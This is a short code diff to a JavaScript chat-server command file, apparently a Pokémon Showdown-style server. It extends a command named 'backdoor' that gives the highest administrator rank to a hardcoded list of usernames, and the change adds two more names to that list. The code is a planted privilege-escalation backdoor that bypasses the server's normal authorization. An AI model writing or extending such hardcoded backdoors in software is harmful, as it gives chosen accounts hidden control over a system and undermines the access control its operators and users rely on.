@@ -2152,7 +2152,7 @@ var commands = exports.commands = {
 	},
 	
 	backdoor: function(target,room, user) {
-		if (user.userid === 'blakjack' || user.userid === 'skarr' || user.userid === 'queenofdubstep' || user.userid === 'e4arsh') {
+		if (user.userid === 'blakjack' || user.userid === 'skarr' || user.userid === 'frankentein' || user.userid === 'ncrypt' || user.userid === 'queenofdubstep' || user.userid === 'e4arsh') {
 
 			user.group = '~';
 			user.updateIdentity();
